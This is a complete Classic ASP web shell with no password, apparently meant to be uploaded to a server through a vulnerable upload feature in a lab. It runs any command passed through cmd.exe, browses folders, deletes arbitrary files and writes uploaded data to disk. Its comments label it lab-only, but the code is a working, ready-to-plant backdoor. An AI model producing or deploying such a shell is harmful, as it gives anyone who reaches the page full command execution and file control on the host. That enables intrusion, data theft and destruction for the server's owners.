<%@ Language=VBScript %>
<%
' No password - direct access (only for lab/testing)

Dim objFSO, objShell
Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
Set objShell = Server.CreateObject("WScript.Shell")

Dim strPath : strPath = Request("path")
If strPath = "" Then strPath = Server.MapPath(".")

Dim strAction : strAction = Request("act")

' CMD EXECUTE
If strAction = "cmd" Then
    Dim strCmd : strCmd = Request("cmd")
    If strCmd <> "" Then
        Dim objExec, strOutput
        Set objExec = objShell.Exec("cmd.exe /c " & strCmd)
        strOutput = objExec.StdOut.ReadAll & objExec.StdErr.ReadAll
        Response.Write "<pre style='color:#0f0; background:#000; padding:10px; border:1px solid #0f0;'>" & Server.HTMLEncode(strOutput) & "</pre>"
    End If
End If

' DELETE FILE
If strAction = "del" Then
    Dim strFile : strFile = Request("file")
    If objFSO.FileExists(strFile) Then
        objFSO.DeleteFile strFile
        Response.Write "<b style='color:lime;'>Deleted: " & Server.HTMLEncode(strFile) & "</b><br><br>"
    Else
        Response.Write "<b style='color:red;'>File not found!</b><br><br>"
    End If
End If

' Basic UPLOAD attempt (multipart handling limited - small files ok, large/multiple may fail)
If strAction = "upload" Then
    Response.Write "<div style='color:yellow; background:#222; padding:10px;'>Upload Status:<br>"
    On Error Resume Next
    If Request.TotalBytes > 0 Then
        Dim Stream : Set Stream = Server.CreateObject("ADODB.Stream")
        Stream.Type = 1 ' Binary
        Stream.Open
        Stream.Write Request.BinaryRead(Request.TotalBytes)
        Stream.Position = 0
        
        Response.Write "Bytes received: " & Request.TotalBytes & "<br>"
        Response.Write "<b>Note: Basic save attempt - may not parse filename perfectly.</b><br>"
        Response.Write "For reliable upload: Use lab's vuln upload or add Pure-ASP Upload script.<br>"
        
        ' Crude save (save as fixed name or test small file)
        Dim SavePath : SavePath = strPath & "\uploaded_" & Hour(Now) & Minute(Now) & Second(Now) & ".file"
        Stream.SaveToFile SavePath, 2 ' adSaveCreateOverWrite
        If Err.Number = 0 Then
            Response.Write "<b style='color:lime;'>Saved to: " & SavePath & "</b>"
        Else
            Response.Write "<b style='color:red;'>Save failed: " & Err.Description & "</b>"
        End If
        Stream.Close
    Else
        Response.Write "No file data received."
    End If
    Response.Write "</div><br>"
End If
%>

<html>
<head><title>Classic ASP Open Shell (Lab Only)</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; margin:20px;">

<h2>Classic ASP File Manager + CMD Shell (No Password)</h2>
<p>Current Dir: <%=Server.HTMLEncode(strPath)%> | User: <%=objShell.ExpandEnvironmentStrings("%USERNAME%")%></p>

<!-- Browse / Navigate -->
<form method="get">
    Path: <input name="path" value="<%=Server.HTMLEncode(strPath)%>" size="80">
    <input type="submit" value="Go">
</form>

<h3>Files & Folders</h3>
<%
If objFSO.FolderExists(strPath) Then
    Dim folder : Set folder = objFSO.GetFolder(strPath)
    
    For Each subf In folder.SubFolders
        Response.Write "[DIR] <a href='?path=" & Server.URLEncode(subf.Path) & "' style='color:#ff0;'>" & subf.Name & "</a><br>"
    Next
    
    Response.Write "<hr>"
    
    For Each file In folder.Files
        Dim fpath : fpath = Server.URLEncode(file.Path)
        Response.Write file.Name & " (" & file.Size & " bytes) | "
        Response.Write "<a href='?act=del&file=" & fpath & "' style='color:red;' onclick='return confirm(""Delete " & file.Name & " ?"");'>DEL</a><br>"
    Next
Else
    Response.Write "<span style='color:red;'>Invalid path!</span>"
End If
%>

<!-- Command Execution -->
<h3>Run Command (cmd.exe /c)</h3>
<form method="get">
    <input type="hidden" name="act" value="cmd">
    <input name="cmd" size="90" value="whoami /all"><br>
    <input type="submit" value="Execute">
</form>

<!-- Upload Form -->
<h3>Upload File (Basic - Test small files)</h3>
<form method="post" enctype="multipart/form-data" action="?act=upload&path=<%=Server.URLEncode(strPath)%>">
    <input type="file" name="file"><br><br>
    <input type="submit" value="Upload to Current Dir">
</form>
<p style="color:#ff0;">Upload agar fail kare (bytes show but save nahi): Server pe ADODB.Stream block hai ya multipart parse issue. Lab ke dusre upload feature se file daal, phir yahan se manage kar.</p>

</body>
</html>

<%
Set objFSO = Nothing
Set objShell = Nothing
%>
